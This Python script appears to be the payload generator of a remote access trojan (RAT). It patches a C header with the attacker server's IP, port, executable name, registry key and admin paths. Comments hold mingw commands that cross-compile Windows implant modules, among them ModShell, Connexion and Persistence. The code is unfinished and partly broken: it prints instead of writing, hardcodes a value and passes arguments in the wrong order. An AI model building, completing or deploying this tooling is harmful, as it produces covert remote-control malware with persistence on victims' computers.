from subprocess import Popen
from subprocess import PIPE
import sys
import server.scripts.other as other
import argparse

from colorama import Fore,Style,init


class GeneratePayload:

    error = False

    def __init__(self,ip,auto=False, port=4444, reco=False, name="payload.exe"):

        self.path = "client/inc/common.h"
        self.list_const_str = ["IP_ADDRESS","NAME_PROG","PATH_ADMIN","PATH_NOT_ADMIN","NAME_KEY_REGISTER","SPLIT"]
        
        if(auto):
            self.auto = "true"
        else:
            self.auto = "false"
        if(reco):
            self.reco = "true"
        else:
            self.reco = "false"
                

        self.port = port
        self.ip = ip 
        self.name = name

        self.main()

    def restoredFile(self,file_list):
        #Restores the original file.
        #Inserts a line break before each '#'. 
        result = ""
        file_str = ""

        #Transtype list to str
        for elem in file_list:
            file_str += elem + " "

        #insert return line
        for i in range(len(file_str)):
            if(file_str[i] == "#"):
                print("detect #")
                result += "\r\n" + file_str[i] 
            else:
                result += file_str[i] 
        print(result)
        

    def readFile(self):
        #Returns the file in list
        result = ""
        try:
            with open(self.path,"r") as file:
                result = str(file.read())
        except (OSError, IOError) as e:
            other.printColor("error","[-] error when opening the file {}: {}".format(self.path,e))
            GeneratePayload.error = True
            exit(0)

        else:
            return result.split()

    def replaceFile(self, file_list,const , newvalue):
        '''
        Modifies the common.h file
        Adds the console pass arguments to the common file.
        To do this it looks for overflows the index and replaces the old value.
        then it calls restoredFile
        '''
        
        #Check if str and modify if needed
        for elem in self.list_const_str:#test if newvalue needs quotation marks 
            
            if elem == const:
                print("THE VALUE IS STR APPEND '' ")
                newvalue = "\"" + newvalue + "\""
                print("FINAL: ", newvalue)

        try:
            
            index = file_list.index(const)

        except ValueError:

            other.printColor("error","[-] Increase {} was not found".format(const))
            GeneratePayload.error = True 
            exit(0)

        else:
            
            file_list[index+1] = newvalue
            self.restoredFile(file_list)
            #with open(self.path, "w") as file:
            #    file.write(new_file_str)


    def main(self):
        #Choice default.
        #If the user does not add any argument in the command line.
        other.printColor("information","[+] MOD MIN")
        self.replaceFile(self.readFile(),"PATH_ADMIN" ,"1212")
        #self.replaceFile(self.readFile(), )
        pass


parser = argparse.ArgumentParser()
parser.add_argument("-a","--auto", action="store_true", default=False, help="if the parameter is added, the rat will automatically perform the persistence.")
parser.add_argument("-p","--port", dest="PORT", default=4444, help="the port number of the server.")
parser.add_argument("-i","--ip", dest="IP", required=True, help="IP address of the server.")
parser.add_argument("-r","--reconect", dest="RECONNECT",default=20,  help="the time between each reconnection attempt if the server is offline (in seconds).")
parser.add_argument("-n","--name",dest="NAME",default="payload.exe", help="the name of the executable (of the rat)")


try:

    argv = vars(parser.parse_args())
    print(argv)
    print(len(argv))

    AUTO = argv["auto"]
    PORT = argv["PORT"]
    IP  = argv["IP"]
    RECO = argv["RECONNECT"]
    name = argv["NAME"]


    GeneratePayload(IP, AUTO, PORT, RECO, name)

except SystemExit:
    
    if(GeneratePayload.error):
        pass
    else:
        print("example: /usr/bin/python3 RATGenerator.py --ip 192.0.0.1" )
    

except KeyboardInterrupt:
    other.printColor("information","[-] Generator stop.")


#i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o 12.exe -lws2_32
#i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o 12.exe -lws2_32 -static-libgcc -static-libstdc++ -Os -s
#https://stackoverflow.com/questions/7973274/how-to-reduce-the-size-of-executable-produced-by-mingw-g-compiler
#https://arrayfire.com/cross-compile-to-windows-from-linux/